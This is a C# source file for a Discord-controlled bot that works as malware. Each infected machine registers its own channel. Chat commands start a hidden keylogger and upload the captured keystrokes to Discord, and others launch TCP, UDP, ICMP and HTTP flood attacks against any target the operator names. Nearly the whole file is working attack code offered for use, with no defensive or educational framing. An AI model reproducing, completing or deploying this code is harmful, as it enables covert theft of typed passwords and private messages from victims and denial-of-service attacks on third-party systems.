﻿using System;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net;
using System.Text;

class Program
{
    private DiscordSocketClient _client;

    private string ClientName = Environment.MachineName.ToLower();
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    static async Task Main(string[] args)
    {
        var program = new Program();
        await program.RunBotAsync();
    }

    public async Task RunBotAsync()
    {
        _client = new DiscordSocketClient(new DiscordSocketConfig
        {
            GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent,
        });
        _client.Log += LogAsync;
        _client.Ready += OnReady;
        _client.MessageReceived += MessageReceivedAsync;

        //Replace with your token
        await _client.LoginAsync(TokenType.Bot, "token");
        await _client.StartAsync();

        await Task.Delay(-1);
    }

    private async Task OnReady()
    {
        // Replace with your guild ID
        ulong guildId = 123;

        var guild = _client.GetGuild(guildId);

        if (guild != null)
        {
            var category = guild.CategoryChannels.FirstOrDefault(c => c.Name.ToLower() == "clients");

            if (category != null)
            {
                var channel = category.Channels.FirstOrDefault(c => c.Name == ClientName);

                if (channel == null)
                {
                    await guild.CreateTextChannelAsync(ClientName, properties =>
                    {
                        properties.CategoryId = category.Id;
                    });
                }
            }

        }
    }

    private async Task MessageReceivedAsync(SocketMessage message)
    {
        if (message.Author.IsBot) return;

        if (message.Channel is ITextChannel textChannel)
        {
            if (textChannel.Name == ClientName || textChannel.Name == "broadcast")
            {
                if (message.Content.ToLower().StartsWith("!help"))
                {
                    Console.WriteLine("Hellow command");
                    await message.Channel.SendMessageAsync("Help message");
                }
                if (message.Content.ToLower().StartsWith("!startkeylogger"))
                {
                    Thread logger = new Thread(KeyLogger);
                    logger.Start();
                }
                //Dump the keylogger contents
                if (message.Content.ToLower().StartsWith("!dumpkeylogger"))
                {
                    if (File.Exists("./log.txt"))
                    {
                        string res = File.ReadAllText("./log.txt");
                        await message.Channel.SendMessageAsync(res);
                        File.Delete("./log.txt");
                    }
                    
                }
                //TCP attack
                if (message.Content.ToLower().StartsWith("!tcp"))
                {
                    string[] parts = message.Content.ToLower().Split(' ');
                    string ip = parts[1];
                    int port = int.Parse(parts[2]);
                    int size = int.Parse(parts[3]);
                    tcpattack(ip, port, size);
                }
                //UDP attack
                if (message.Content.ToLower().StartsWith("!udp"))
                {
                    string[] parts = message.Content.ToLower().Split(' ');
                    string ip = parts[1];
                    int port = int.Parse(parts[2]);
                    int size = int.Parse(parts[3]);
                    udpattack(ip, port, size);
                }
                ///HTTP GET attack
                if (message.Content.ToLower().StartsWith("!http"))
                {
                    string[] parts = message.Content.ToLower().Split(' ');
                    string url = parts[1];
                    HTTPGETATTACK(url);
                }

                //ICMP attack
                if (message.Content.ToLower().StartsWith("!icmp"))
                {
                    string[] parts = message.Content.ToLower().Split(' ');
                    string ip = parts[1];
                    icmpattack(ip);
                }
            }
        }

    }

    private async void KeyLogger()
    {
        string path = "./log.txt";
        while (true)
        {
            for (int i = 0; i < 255; i++)
            {
                int key = GetAsyncKeyState(i);
                if (key == 1 || key == -32767 || key == 32769)
                {
                    Console.WriteLine((char)i);
                    using (StreamWriter writer = new StreamWriter(path, true))
                    {
                        writer.Write(verifyKey(i));
                        writer.Flush();
                    }

                    break;
                }
            }
        }
    }

    //Convert keys into their readable form.
    private String verifyKey(int code)
    {
        String key = "";

        if (code == 8) key = "[Back]";
        else if (code == 9) key = "[TAB]";
        else if (code == 13) key = "[Enter]";
        else if (code == 19) key = "[Pause]";
        else if (code == 20) key = "[Caps Lock]";
        else if (code == 27) key = "[Esc]";
        else if (code == 32) key = "[Space]";
        else if (code == 33) key = "[Page Up]";
        else if (code == 34) key = "[Page Down]";
        else if (code == 35) key = "[End]";
        else if (code == 36) key = "[Home]";
        else if (code == 37) key = "Left]";
        else if (code == 38) key = "[Up]";
        else if (code == 39) key = "[Right]";
        else if (code == 40) key = "[Down]";
        else if (code == 44) key = "[Print Screen]";
        else if (code == 45) key = "[Insert]";
        else if (code == 46) key = "[Delete]";
        else if (code == 48) key = "0";
        else if (code == 49) key = "1";
        else if (code == 50) key = "2";
        else if (code == 51) key = "3";
        else if (code == 52) key = "4";
        else if (code == 53) key = "5";
        else if (code == 54) key = "6";
        else if (code == 55) key = "7";
        else if (code == 56) key = "8";
        else if (code == 57) key = "9";
        else if (code == 65) key = "a";
        else if (code == 66) key = "b";
        else if (code == 67) key = "c";
        else if (code == 68) key = "d";
        else if (code == 69) key = "e";
        else if (code == 70) key = "f";
        else if (code == 71) key = "g";
        else if (code == 72) key = "h";
        else if (code == 73) key = "i";
        else if (code == 74) key = "j";
        else if (code == 75) key = "k";
        else if (code == 76) key = "l";
        else if (code == 77) key = "m";
        else if (code == 78) key = "n";
        else if (code == 79) key = "o";
        else if (code == 80) key = "p";
        else if (code == 81) key = "q";
        else if (code == 82) key = "r";
        else if (code == 83) key = "s";
        else if (code == 84) key = "t";
        else if (code == 85) key = "u";
        else if (code == 86) key = "v";
        else if (code == 87) key = "w";
        else if (code == 88) key = "x";
        else if (code == 89) key = "y";
        else if (code == 90) key = "z";
        else if (code == 91) key = "[Windows]";
        else if (code == 92) key = "[Windows]";
        else if (code == 93) key = "[List]";
        else if (code == 96) key = "0";
        else if (code == 97) key = "1";
        else if (code == 98) key = "2";
        else if (code == 99) key = "3";
        else if (code == 100) key = "4";
        else if (code == 101) key = "5";
        else if (code == 102) key = "6";
        else if (code == 103) key = "7";
        else if (code == 104) key = "8";
        else if (code == 105) key = "9";
        else if (code == 106) key = "*";
        else if (code == 107) key = "+";
        else if (code == 109) key = "-";
        else if (code == 110) key = ",";
        else if (code == 111) key = "/";
        else if (code == 112) key = "[F1]";
        else if (code == 113) key = "[F2]";
        else if (code == 114) key = "[F3]";
        else if (code == 115) key = "[F4]";
        else if (code == 116) key = "[F5]";
        else if (code == 117) key = "[F6]";
        else if (code == 118) key = "[F7]";
        else if (code == 119) key = "[F8]";
        else if (code == 120) key = "[F9]";
        else if (code == 121) key = "[F10]";
        else if (code == 122) key = "[F11]";
        else if (code == 123) key = "[F12]";
        else if (code == 144) key = "[Num Lock]";
        else if (code == 145) key = "[Scroll Lock]";
        else if (code == 160) key = "[Shift]";
        else if (code == 161) key = "[Shift]";
        else if (code == 162) key = "[Ctrl]";
        else if (code == 163) key = "[Ctrl]";
        else if (code == 164) key = "[Alt]";
        else if (code == 165) key = "[Alt]";
        else if (code == 187) key = "=";
        else if (code == 186) key = "ç";
        else if (code == 188) key = ",";
        else if (code == 189) key = "-";
        else if (code == 190) key = ".";
        else if (code == 192) key = "'";
        else if (code == 191) key = ";";
        else if (code == 193) key = "/";
        else if (code == 194) key = ".";
        else if (code == 219) key = "´";
        else if (code == 220) key = "]";
        else if (code == 221) key = "[";
        else if (code == 222) key = "~";
        else if (code == 226) key = "\\";
        else key = "[" + code + "]";

        return key;
    }

    private String generateStringSize(long sizeByte)
    {

        StringBuilder sb = new StringBuilder();
        Random rd = new Random();

        var numOfChars = sizeByte;
        string allows = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        int maxIndex = allows.Length - 1;
        for (int i = 0; i < numOfChars; i++)
        {
            int index = rd.Next(maxIndex);
            char c = allows[index];
            sb.Append(c);
        }
        return sb.ToString();
    }

    private void udpattack(string ip, int size, int port)
    {
        int amount = 0;
        int amountf = 0;

        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
            ProtocolType.Udp);

        IPAddress serverAddr = IPAddress.Parse(ip);

        IPEndPoint endPoint = new IPEndPoint(serverAddr, port);
        string data = generateStringSize(1024 * size);
        byte[] sus = Encoding.ASCII.GetBytes(data);
        sock.Connect(serverAddr, port);
        for (; ; )
        {
            new Thread(() =>
            {
                try
                {
                    sock.SendTo(sus, endPoint);
                    amount++;
                    Console.WriteLine(amount);
                }
                catch
                {
                    amountf++;
                }
            }).Start();
        }
    }
    private void tcpattack(string ip, int port, int size)
    {
        int amount = 0;
        int amountf = 0;

        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        IPAddress serverAddr = IPAddress.Parse(ip);

        IPEndPoint endPoint = new IPEndPoint(serverAddr, port);
        string data = generateStringSize(1024 * size);
        byte[] sus = Encoding.ASCII.GetBytes(data);
        sock.Connect(serverAddr, port);
        while(true)
        {
            new Thread(() =>
            {
                try
                {
                    sock.SendTo(sus, endPoint);
                    amount++;
                    Console.WriteLine("Sent packets: {0} ", amount);
                }
                catch
                {
                    amountf++;
                    Console.WriteLine("Unsent packets: {0}", amountf);
                }
            }).Start();
        }
    }
    private void icmpattack(string ip)
    {
        int amount = 0;
        int amountf = 0;

        new Thread(() =>
        {
            Ping pingSender = new Ping();
            string data = generateStringSize(1024 * 1);
            byte[] sus = Encoding.ASCII.GetBytes(data);
            int timeout = 5000;
            PingOptions options = new PingOptions(64, true);
            for (; ; )
            {
                new Thread(() =>
                {
                    try
                    {
                        PingReply reply = pingSender.Send(ip, timeout, sus, options);
                        amount++;
                        Console.WriteLine("Sent packets: {0} ", amount);
                    }
                    catch
                    {
                        amountf++;
                        Console.WriteLine("Unsent packets: {0}", amountf);
                    }
                }).Start();
            }
        }).Start();
    }
    private void HTTPGETATTACK(string url)
    {
        int amount = 0;
        int amountf = 0;


        for (; ; )
        {
            new Thread(() =>
            {
                WebRequest request = WebRequest.Create(url);
                request.Method = "GET";
                try
                {
                    WebResponse response = request.GetResponse();
                    amount++;
                    Console.WriteLine("Sent packets: {0} ", amount);
                }
                catch
                {
                    amountf++;
                    Console.WriteLine("Unsent packets: {0}", amountf);
                }
            }).Start();
        }
    }

    private Task LogAsync(LogMessage log)
    {
        Console.WriteLine(log);
        return Task.CompletedTask;
    }
}
